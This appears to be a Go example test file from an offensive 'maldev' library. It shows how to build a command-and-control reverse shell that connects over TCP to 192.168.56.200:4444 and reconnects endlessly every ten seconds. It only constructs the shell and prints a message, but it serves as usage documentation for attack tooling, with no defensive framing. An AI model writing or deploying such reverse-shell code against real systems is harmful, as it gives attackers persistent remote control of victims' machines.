package shell_test

import (
	"fmt"
	"time"

	"github.com/oioio-space/maldev/c2/shell"
	"github.com/oioio-space/maldev/c2/transport"
)

// New builds a reverse shell with auto-reconnect. Pass a
// transport.Transport (TCP/TLS/etc.) plus a Config. ShellPath /
// ShellArgs / MaxRetries / ReconnectWait tune behaviour.
func ExampleNew() {
	tcp := transport.NewTCP("192.168.56.200:4444", 5*time.Second)
	cfg := &shell.Config{
		MaxRetries:    0,
		ReconnectWait: 10 * time.Second,
	}
	sh := shell.New(tcp, cfg)
	_ = sh
	fmt.Println("shell built; call shell methods (Connect/Run/...) per consumer needs")
}
